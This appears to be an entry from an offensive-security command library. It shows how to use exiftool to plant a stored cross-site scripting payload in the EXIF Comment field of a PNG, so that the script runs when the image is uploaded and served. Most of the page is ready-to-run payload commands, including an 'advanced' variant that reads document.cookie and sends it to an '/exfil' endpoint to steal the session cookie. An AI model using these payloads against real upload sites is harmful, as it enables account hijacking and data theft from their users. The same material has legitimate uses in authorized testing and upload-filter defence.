---
id: cmd-exiftool-xss-964550
data: >-
  exiftool -Comment="\"><script>alert(prompt('XSS BY ZEROX4'))</script>"
  xss_comment_exif_metadata_double_quote.png
tags:
  - metadata
  - xss
type: command
output: 1 image files updated
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:49.244Z'
verified: false
validated: true
submitted: true
---
# exiftool-inject-xss-into-png-comment

## Command

```bash
exiftool -Comment="\"><script>alert(prompt('XSS BY ZEROX4'))</script>" xss_comment_exif_metadata_double_quote.png
```

## Description

This command uses exiftool to inject an XSS payload into the EXIF Comment tag of a PNG file, enabling stored XSS when the file is uploaded and served as HTML.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-Comment` | Sets the EXIF Comment tag value; payload closes tags and injects script | Yes |
| `\"` | Escapes double quotes in the payload string | Yes |
| `filename` | Target PNG file to modify (input and output) | Yes |

## Examples

### Basic Usage

```bash
exiftool -Comment="\"><script>alert('XSS')</script>" image.png
```

### Advanced Usage

```bash
exiftool -Comment="\"><script>fetch('/exfil?data='+document.cookie)</script>" -overwrite_original malicious.png
```

## Expected Output

"1 image files updated" – confirms the metadata was written; the file now contains the payload in its Comment field, verifiable with `exiftool -Comment file.png`.

## Related

- [[Related Procedure: Embed-XSS-Payload-in-PNG-Metadata]]
